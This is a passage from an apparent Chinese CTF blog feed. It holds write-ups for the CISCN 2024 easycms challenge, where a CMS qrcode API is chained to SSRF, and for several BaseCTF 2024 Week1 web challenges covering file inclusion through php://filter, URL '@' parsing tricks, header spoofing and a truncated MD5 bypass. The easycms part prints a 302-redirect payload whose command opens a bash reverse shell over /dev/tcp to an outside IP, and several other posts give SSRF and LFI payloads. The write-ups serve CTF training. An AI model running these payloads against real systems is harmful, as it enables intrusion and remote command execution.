class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_catcher_data</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$timeout</span> = <span class="number">0</span>, <span class="variable">$is_log</span> = <span class="literal">true</span>, <span class="variable">$ct</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$url</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取本地文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;file://&#x27;</span>)  === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;/&#x27;</span>)  === <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(WEBPATH.<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(WEBPATH.<span class="variable">$url</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">dr_is_url</span>(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (CI_DEBUG &amp;&amp; <span class="variable">$is_log</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">log_message</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;获取远程数据失败[&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;]：地址前缀要求是http开头&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// curl模式</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_init&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&quot;https://&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// 跳过证书检查</span></span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">true</span>); <span class="comment">// 从证书中检查SSL加密算法是否存在</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ct</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)&#x27;</span> . <span class="string">&#x27;Gecko/20100101 Firefox/40.0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept: */*&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;X-Requested-With: XMLHttpRequest&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Referer: &#x27;</span>.<span class="variable">$url</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3&#x27;</span>,</span><br><span class="line">            ));</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_USERAGENT,<span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">///</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span> );</span><br><span class="line">        <span class="comment">// 最大执行时间</span></span><br><span class="line">        <span class="variable">$timeout</span> &amp;&amp; <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT, <span class="variable">$timeout</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>,CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="variable">$errno</span> = <span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (CI_DEBUG &amp;&amp; <span class="variable">$errno</span> &amp;&amp; <span class="variable">$is_log</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">log_message</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;获取远程数据失败[&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;]：（&#x27;</span>.<span class="variable">$errno</span>.<span class="string">&#x27;）&#x27;</span>.<span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$code</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$errno</span> == <span class="number">35</span>) &#123;</span><br><span class="line">            <span class="comment">// 当服务器不支持时改为普通获取方式</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$ct</span>) &#123;</span><br><span class="line">                <span class="comment">// 尝试重试</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$url</span>, <span class="variable">$timeout</span>, <span class="variable">$is_log</span>, <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (CI_DEBUG &amp;&amp; <span class="variable">$code</span> &amp;&amp; <span class="variable">$is_log</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">log_message</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;获取远程数据失败[&#x27;</span>.<span class="variable">$url</span>.<span class="string">&#x27;]http状态：&#x27;</span>.<span class="variable">$code</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现关键函数<code>$data = curl_exec($ch);</code></p><p>理一下逻辑就是<code>qrcode()</code>会调用<code>dr_catcher_data()</code>，<code>dr_catcher_data()</code>又会调用<code>curl_exec()</code>达成SSRF，并且<code>$ch</code>由<code>$url</code>决定，<code>$url</code>又由<code>thumb</code>决定，因此调用<code>qrcode()</code>并且给<code>$thumb</code>参数传入目标地址即可完成SSRF</p><p>查询<a href="(https://www.xunruicms.com/doc/806.html)">文档</a>，仿照的<code>captcha</code>的调用规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">captcha</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$code</span> = <span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;captcha&#x27;</span>)-&gt;<span class="title function_ invoke__">create</span>(</span><br><span class="line">            <span class="title function_ invoke__">max</span>(<span class="number">0</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;width&#x27;</span>])), <span class="title function_ invoke__">max</span>(<span class="number">0</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;height&#x27;</span>]))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;cache&#x27;</span>)-&gt;<span class="title function_ invoke__">set_auth_data</span>(<span class="string">&#x27;web-captcha-&#x27;</span>.USER_HTTP_CODE, <span class="variable">$code</span>, SITE_ID);</span><br><span class="line">        IS_DEV &amp;&amp; <span class="title function_ invoke__">log_message</span>(<span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;图片验证码生成（&#x27;</span>.USER_HTTP_CODE.<span class="string">&#x27;）验证码：&#x27;</span>.<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;<span class="comment">//此处的captcha()与qrcode()均位于/dayrui/Fcms/Control/Api/Api.php路径下，因此可以仿照captcha()的调用形式来调用qrcode()</span></span><br></pre></td></tr></table></figure><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_5.png"></p><p>仿照构建<code>index.php?s=api&amp;c=api&amp;m=qrcode</code>即可调用<code>qrcode</code>模块，<code>appid</code>和<code>appsecret</code>参数是小程序开发用到的，此处不需要</p><p>注意到<code>qrcode()</code>下还有这么几个参数需要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));  <span class="comment">//qr码数据</span></span><br><span class="line"><span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));  <span class="comment">//qr码中间logo的地址</span></span><br><span class="line"><span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);  <span class="comment">//qr码尺寸</span></span><br><span class="line"><span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));  <span class="comment">//qr码纠错等级</span></span><br></pre></td></tr></table></figure><p>我们只需要关心<code>$thumb</code>参数，其余参数合理即可</p><p>因此构建<code>payload</code>:<code>index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;thumb=http://127.0.0.1/flag.php&amp;size=1024&amp;level=1</code></p><p>尝试直接打一下，得到回显</p><p><img src="/./../post_img/f929178bed62f37812409241403e09ae/ciscn2024_web_easycms_6.png"></p><p>打到这一步发现<code>ctfshow</code>的靶场给的不对，写的<code>easycms</code>，结果实际是<code>easycms_revenge</code></p><p><code>easycms_revenge</code>相比<code>easycms</code>进行了函数修复，过滤判断了<code>url</code></p><p>既然提示“此图片不是一张可用的图片”，那就可以参考文件上传的绕过方法，即添加图片头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/117.72.40.183/2333%200%3E&amp;1%22&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;GIF89a&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//服务器部署web服务，开放2233端口，反弹到2333端口上，命名为302.php</span></span><br><span class="line"><span class="comment">//此处是在服务器上部署了一个在2233端口上开放的web服务，通过发送payload使得靶机访问thumb的地址(即本地服务器)，而在本地服务器上又给到了Location这一个请求头，使得进行302重定向，重定向地址即为127.0.0.1/flag同时传入cmd参数进行反弹shell</span></span><br></pre></td></tr></table></figure><p>监听2233端口并发送到<code>payload</code>:</p><p><code>/index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=adwdadwwda&amp;thumb=http://117.72.40.183:2233/302.php&amp;size=1024&amp;level=1</code></p><p>即可反弹<code>shell</code>，但是这边似乎是<code>ctfshow</code>靶场的原因，<code>shell</code>弹不出来</p><p>后面又尝试用”&gt;”写文件，也读取不了，可惜</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/uuzeray/article/details/139052904">【Web】CISCN 2024初赛 题解(全)</a></p><p><a href="https://1cfh.fun/2024/05/21/WriteUp/2024-CISCN-Review/#easycms-revenge-easycms">2024-CISCN初赛-Web-复现 | 1cfh’Blog</a></p><p><a href="https://blog.csdn.net/Jayjay___/article/details/139047540">第十七届全国大学生信息安全竞赛 CISCN 2024 创新实践能力赛初赛 Web方向 部分题解WP_第十七届全国大学生信息安全竞赛考试内容-CSDN博客</a></p><p><a href="https://blog.csdn.net/Err0r233/article/details/139089870">CISCN2024-Web方向题解_ciscn2024web-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024-Web-WP</title>
      <link href="/post/480e04f9.html"/>
      <url>/post/480e04f9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h2><p><a href="https://j0zr0js7k7j.feishu.cn/docx/U2dVdIOTCoLrp9xaYCrcEEbkndh">https://j0zr0js7k7j.feishu.cn/docx/U2dVdIOTCoLrp9xaYCrcEEbkndh</a></p><h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>​文字游戏 玩得开心！</p><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul><li>源代码查看</li></ul><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>右键F5查看源代码即可，翻到底部即可看到flag。</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week1_web_adarkroom_1.png" alt="basectf2024_week1_web_adarkroom_1"></p><h2 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>​你好呀, Aura 酱，这是给你的礼物哦~ 快打开看看里面是什么吧！</p><h3 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h3><ul><li><p>伪协议</p></li><li><p>SSRF</p></li><li><p>文件包含</p></li></ul><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>​访问题目，题面为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>); </span><br></pre></td></tr></table></figure><p>​很明显，最后有一个<code>include($gift)</code>，很明显是文件包含漏洞。</p><p>​在到达<code>include()</code>前，需要绕过3个if判断。</p><p>​对于第一个if判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​利用伪协议<code>data://text/plain,Aura</code>即可通过判断。</p><p>​对于第二个if判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>strpos()</code>要求了<code>http://jasmineaura.github.io</code>必须出现在<code>$challenge</code>变量的最前面。</p><p>​第三个if判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​又要求在<code>$challenge</code>的这个网站中包含<code>已经收到Kengwang的礼物啦</code>这个字符串，但通过访问<code>http://jasmineaura.github.io</code>可以发现，该网页中不存在要求的字符串，也不存在留言的位置。</p><p>​显然，直接访问<code>http://jasmineaura.github.io</code>显然是不行的，对此，我们可以使用<code>@</code>，例如<code>www.baidu.com@127.0.0.1</code>这个url实际访问的是<code>127.0.0.1</code>而不是<code>www.baidu.com</code>，这种写法会使得浏览器忽略<code>@</code>前的地址而访问其后的地址，类似的，<code>www.baidu.com#127.0.0.1</code>则访问的是<code>www.baidu.com</code>。</p><p>​至此，我们就可以在满足第二条判断的同时，控制实际访问的地址。</p><p>​当然，你可以自己创建一个带有目标字符串的服务器，控制靶机访问你的服务器，但最简单的方法应该是直接让靶机访问获取自己的信息，很显然，它自带这串目标字符串，不是吗。</p><p>​至此，我们已经绕过所有判断，可以进行文件包含了，这里选择使用</p><p>​<code>php://filter/convert.base64-encode/resource=flag.php</code>来进行文件读取。</p><p>​综上，payload为，post传参即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pen=data:<span class="regexp">//</span>text<span class="regexp">/plain,Aura&amp;challenge=http:/</span><span class="regexp">/jasmineaura.github.io@127.0.0.1&amp;gift=php:/</span><span class="regexp">/filter/</span>convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>​最后将获得的base64字符串解码，获得flag</p><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>​成为嘿客的第一步！当然是 HTTP 啦！<br>​可以多使用搜索引擎搜索每个参数的含义以及传参方式</p><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><ul><li><p>请求方式</p></li><li><p>请求头伪造</p></li></ul><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week1_web_http_1.png" alt="basectf2024_week1_web_http_1">根据要求传参即可</p><p>​首先是GET参数，如果直接传<code>basectf=we1c%00me</code>是不行的，因为<code>%00</code>会被转义为空，我们需要对%进行一下url编码，<code>%25</code>表示%，传入<code>basectf=we1c%2500me</code>即可</p><p>​然后是POST参数，传入<code>Base=fl@g</code>即可</p><p>​接着是Cookie参数，传入<code>c00k13=i can&#39;t eat it</code>即可</p><p>​然后是User-Agent参数，修改为<code>Base</code></p><p>​接着是Referer参数，修改为<code>Base</code></p><p>​最后是ip，添加请求头<code>X-Forwarded-For: 127.0.0.1</code>即可</p><p>​完成后会发生跳转</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week1_web_http_2.png" alt="basectf2024_week1_web_http_2"></p><p>​来的路上？抵达终点之前？用BurpSuite抓包看看</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week1_web_http_3.png" alt="basectf2024_week1_web_http_3"></p><p>​发现跳转过程中存在flag，base64解码即可</p><p>​跳转过程为&#x2F;  &#x3D;&gt;  &#x2F;success.php?flag&#x3D;xxxxx  &#x3D;&gt;  &#x2F;thankyou.php</p><p>​当然，在&#x2F;thankyou.php界面的Referer参数中也可以看到flag</p><h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>​绕哇绕哇绕</p><h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><ul><li>php的弱比较缺陷</li></ul><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>​查看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>]) )&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$name2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$password2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name2</span> !== <span class="variable">$password2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name2</span>) === <span class="title function_ 